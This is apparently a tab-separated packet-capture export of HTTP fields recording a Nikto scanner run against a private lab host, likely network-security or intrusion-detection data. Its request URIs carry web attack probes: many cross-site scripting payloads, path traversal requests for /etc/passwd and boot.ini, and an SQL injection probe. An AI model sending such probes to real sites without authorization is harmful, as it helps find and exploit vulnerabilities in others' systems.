http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									910						1	http://192.168.1.101/web/calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000909)				/web/calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05
																	Keep-Alive										192.168.1.101									912						1	http://192.168.1.101/web/ca000007.pl?ACTION=SHOWCART&REFPAGE=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000910)				/web/ca000007.pl?ACTION=SHOWCART&REFPAGE=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									914						1	http://192.168.1.101/web/ca000001.pl?ACTION=SHOWCART&hop=\"><script>alert('Vulnerable')</script>&PATH=acatalog%2f		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000911)				/web/ca000001.pl?ACTION=SHOWCART&hop=\"><script>alert('Vulnerable')</script>&PATH=acatalog%2f
																	Keep-Alive										192.168.1.101									916						1	http://192.168.1.101/web/bb000001.pl<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000912)				/web/bb000001.pl<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									918						1	http://192.168.1.101/web/article.php?sid=\"><Img		GET				Src=javascript:alert('Vulnerable')><Img Src=\" HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000913)				/web/article.php?sid=\"><Img
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/article.cfm?id=1'<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000914)				/web/article.cfm?id=1'<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									923						1	http://192.168.1.101/web/apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000915)				/web/apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									925						1	http://192.168.1.101/web/anthill/login.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000916)				/web/anthill/login.php
																	Keep-Alive										192.168.1.101									927						1	http://192.168.1.101/web/admin/login.php?path=\"></form><form		GET				name=a><input name=i value=XSS>&lt;script>alert('Vulnerable')</script> HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000917)				/web/admin/login.php?path=\"></form><form
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/addressbook/index.php?surname=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000918)				/web/addressbook/index.php?surname=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									934						1	http://192.168.1.101/web/addressbook/index.php?name=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000919)				/web/addressbook/index.php?name=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									936						1	http://192.168.1.101/web/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000920)				/web/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									938						1	http://192.168.1.101/web/a?<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000921)				/web/a?<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									940						1	http://192.168.1.101/web/a.jsp/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000922)				/web/a.jsp/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									942						1	http://192.168.1.101/web/?mod=<script>alert(document.cookie)</script>&op=browse		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000923)				/web/?mod=<script>alert(document.cookie)</script>&op=browse
																	Keep-Alive										192.168.1.101									944						1	http://192.168.1.101/web/<script>alert('Vulnerable')</script>.thtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000924)				/web/<script>alert('Vulnerable')</script>.thtml
																	Keep-Alive										192.168.1.101									947						1	http://192.168.1.101/web/<script>alert('Vulnerable')</script>.shtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000925)				/web/<script>alert('Vulnerable')</script>.shtml
																	Keep-Alive										192.168.1.101									949						1	http://192.168.1.101/web/<script>alert('Vulnerable')</script>.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000926)				/web/<script>alert('Vulnerable')</script>.jsp
																	Keep-Alive										192.168.1.101									951						1	http://192.168.1.101/web/<script>alert('Vulnerable')</script>.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000927)				/web/<script>alert('Vulnerable')</script>.aspx
																	Keep-Alive										192.168.1.101									953						1	http://192.168.1.101/web//profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000928)				/web//profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									955						1	http://192.168.1.101/web//comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000929)				/web//comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									957						1	http://192.168.1.101/web/&lt;script&gt;alert('Vulnerable');&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000930)				/web/&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
																	Keep-Alive										192.168.1.101									958						1	http://192.168.1.101/web/%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000931)				/web/%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
																	Keep-Alive										192.168.1.101									959						1	http://192.168.1.101/web/%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000932)				/web/%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
																	Keep-Alive										192.168.1.101									960						1	http://192.168.1.101/web/%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000933)				/web/%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
																	Keep-Alive										192.168.1.101									961						1	http://192.168.1.101/web/%22%3cscript%3ealert(%22xss%22)%3c/script%3e		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000934)				/web/%22%3cscript%3ealert(%22xss%22)%3c/script%3e
																	Keep-Alive										192.168.1.101									962						1	http://192.168.1.101/web/%0a%0a<script>alert(\"Vulnerable\")</script>.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000935)				/web/%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
																	Keep-Alive										192.168.1.101									963						1	http://192.168.1.101/web/add_user.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000938)				/web/add_user.php
																	Keep-Alive										192.168.1.101									964						1	http://192.168.1.101/web/hp/device/this.LCDispatcher		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001011)				/web/hp/device/this.LCDispatcher
																	Keep-Alive										192.168.1.101									965						1	http://192.168.1.101/web/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001184)				/web/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									966						1	http://192.168.1.101/web/mailman/admin/ml-name?\"><script>alert('Vulnerable')</script>;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001210)				/web/mailman/admin/ml-name?\"><script>alert('Vulnerable')</script>;
																	Keep-Alive										192.168.1.101									967						1	http://192.168.1.101/web/webalizer/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001215)				/web/webalizer/
																	Keep-Alive										192.168.1.101									968						1	http://192.168.1.101/web/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001216)				/web/web/
																	Keep-Alive										192.168.1.101									969						1	http://192.168.1.101/web/usage/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001217)				/web/usage/
																	Keep-Alive										192.168.1.101									970						1	http://192.168.1.101/web/affich.php?image=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001223)				/web/affich.php?image=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									971						1	http://192.168.1.101/web/diapo.php?rep=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001224)				/web/diapo.php?rep=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									972						1	http://192.168.1.101/web/index.php?rep=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001225)				/web/index.php?rep=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									973						1	http://192.168.1.101/web/fcgi-bin/echo?foo=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001227)				/web/fcgi-bin/echo?foo=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									974						1	http://192.168.1.101/web/fcgi-bin/echo2?foo=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001228)				/web/fcgi-bin/echo2?foo=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									975						1	http://192.168.1.101/web/fcgi-bin/echo.exe?foo=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001229)				/web/fcgi-bin/echo.exe?foo=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									976						1	http://192.168.1.101/web/fcgi-bin/echo2.exe?foo=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001230)				/web/fcgi-bin/echo2.exe?foo=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									977						1	http://192.168.1.101/web/\"><img%20src=\"javascript:alert(document.domain)\">		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001236)				/web/\"><img%20src=\"javascript:alert(document.domain)\">
																	Keep-Alive										192.168.1.101									978						1	http://192.168.1.101/web/apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001241)				/web/apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									979						1	http://192.168.1.101/web/index.php?err=3&email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001378)				/web/index.php?err=3&email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									980						1	http://192.168.1.101/web/forgot_password.php?email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001379)				/web/forgot_password.php?email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									981						1	http://192.168.1.101/web/bugs/index.php?err=3&email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001380)				/web/bugs/index.php?err=3&email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									982						1	http://192.168.1.101/web/bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001381)				/web/bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									983						1	http://192.168.1.101/web/eventum/index.php?err=3&email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001382)				/web/eventum/index.php?err=3&email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									984						1	http://192.168.1.101/web/eventum/forgot_password.php?email=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001383)				/web/eventum/forgot_password.php?email=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									985						1	http://192.168.1.101/web/forum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001453)				/web/forum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
																	Keep-Alive										192.168.1.101									986						1	http://192.168.1.101/web/zorum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001454)				/web/zorum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
																	Keep-Alive										192.168.1.101									987						1	http://192.168.1.101/web/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001456)				/web/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									988						1	http://192.168.1.101/web/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001457)				/web/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									989						1	http://192.168.1.101/web/SPHERA/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001458)				/web/SPHERA/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									990						1	http://192.168.1.101/web/SPHERA/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001459)				/web/SPHERA/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									991						1	http://192.168.1.101/web/acart2_0/signin.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001460)				/web/acart2_0/signin.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									992						1	http://192.168.1.101/web/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001469)				/web/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini
																	Keep-Alive										192.168.1.101									993						1	http://192.168.1.101/web/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001470)				/web/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									994						1	http://192.168.1.101/web/index.php?vo=\"><script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001487)				/web/index.php?vo=\"><script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									995						1	http://192.168.1.101/web/admin/database/wwForum.mdb		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001490)				/web/admin/database/wwForum.mdb
																	Keep-Alive										192.168.1.101									996						1	http://192.168.1.101/web/shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001503)				/web/shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>
																	Keep-Alive										192.168.1.101									997						1	http://192.168.1.101/web/shopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001504)				/web/shopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									998						1	http://192.168.1.101/web/banners.php?op=EmailStats&cid=1%20AND%20passwd%20LIKE%20'a%'/*		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001506)				/web/banners.php?op=EmailStats&cid=1%20AND%20passwd%20LIKE%20'a%'/*
																	Keep-Alive										192.168.1.101									999						1	http://192.168.1.101/web/showmail.pl?Folder=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001510)				/web/showmail.pl?Folder=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1000						1	http://192.168.1.101/web/search.asp?Search=\">&lt;script&gt;alert(Vulnerable)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003017)				/web/search.asp?Search=\">&lt;script&gt;alert(Vulnerable)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									1001						1	http://192.168.1.101/web/firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003030)				/web/firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz
																	Keep-Alive										192.168.1.101									1002						1	http://192.168.1.101/web/firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003031)				/web/firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									1003						1	http://192.168.1.101/web/antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003032)				/web/antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0
																	Keep-Alive										192.168.1.101									1004						1	http://192.168.1.101/web/antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally)		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003033)				/web/antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally)
																	Keep-Alive										192.168.1.101									1005						1	http://192.168.1.101/web/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter,/system/status/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003034)				/web/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter,/system/status/session
																	Keep-Alive										192.168.1.101									1006						1	http://192.168.1.101/web/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\"><script>alert('Vulnerable')</script>,/system/status/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003035)				/web/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\"><script>alert('Vulnerable')</script>,/system/status/session
																	Keep-Alive										192.168.1.101									1007						1	http://192.168.1.101/web/theme1/selector?button=status,monitor,session&button_url=/system/status/status\"><script>alert('Vulnerable')</script>,/system/status/moniter,/system/status/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003036)				/web/theme1/selector?button=status,monitor,session&button_url=/system/status/status\"><script>alert('Vulnerable')</script>,/system/status/moniter,/system/status/session
																	Keep-Alive										192.168.1.101									1008						1	http://192.168.1.101/web/theme1/selector?button=status,monitor,session\"><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003037)				/web/theme1/selector?button=status,monitor,session\"><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session
																	Keep-Alive										192.168.1.101									1009						1	http://192.168.1.101/web/search.asp?Search=		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003038)				/web/search.asp?Search=
																	Keep-Alive										192.168.1.101									1010						1	http://192.168.1.101/web/examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003081)				/web/examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									1011						1	http://192.168.1.101/web/sgdynamo.exe?HTNAME=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003083)				/web/sgdynamo.exe?HTNAME=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									1012						1	http://192.168.1.101/web/aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003086)				/web/aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									1013						1	http://192.168.1.101/web/webcalendar/colors.php?color=</script><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003117)				/web/webcalendar/colors.php?color=</script><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1014						1	http://192.168.1.101/web/webcalendar/week.php?user=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003118)				/web/webcalendar/week.php?user=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1015						1	http://192.168.1.101/web/debug/dbg?host==<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003122)				/web/debug/dbg?host==<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									1016						1	http://192.168.1.101/web/debug/echo?name=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003123)				/web/debug/echo?name=<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									1017						1	http://192.168.1.101/web/debug/errorInfo?title===<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003124)				/web/debug/errorInfo?title===<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									1018						1	http://192.168.1.101/web/debug/showproc?proc===<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003125)				/web/debug/showproc?proc===<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									1019						1	http://192.168.1.101/web/search.php?sess=your_session_id&lookfor=&lt;script&gt;alert(document.cookie)&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003150)				/web/search.php?sess=your_session_id&lookfor=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
																	Keep-Alive										192.168.1.101									1020						1	http://192.168.1.101/web/addressbook.php?\"><script>alert(Vulnerable)</script><!--		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003170)				/web/addressbook.php?\"><script>alert(Vulnerable)</script><!--
																	Keep-Alive										192.168.1.101									1021						1	http://192.168.1.101/web/options.php?optpage=<script>alert('Vulnerable!')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003171)				/web/options.php?optpage=<script>alert('Vulnerable!')</script>
																	Keep-Alive										192.168.1.101									1022						1	http://192.168.1.101/web/search.php?mailbox=INBOX&what=x&where=<script>alert('Vulnerable!')</script>&submit=Search		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003172)				/web/search.php?mailbox=INBOX&what=x&where=<script>alert('Vulnerable!')</script>&submit=Search
																	Keep-Alive										192.168.1.101									1023						1	http://192.168.1.101/web/help.php?chapter=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003173)				/web/help.php?chapter=<script>alert('Vulnerable')</script>
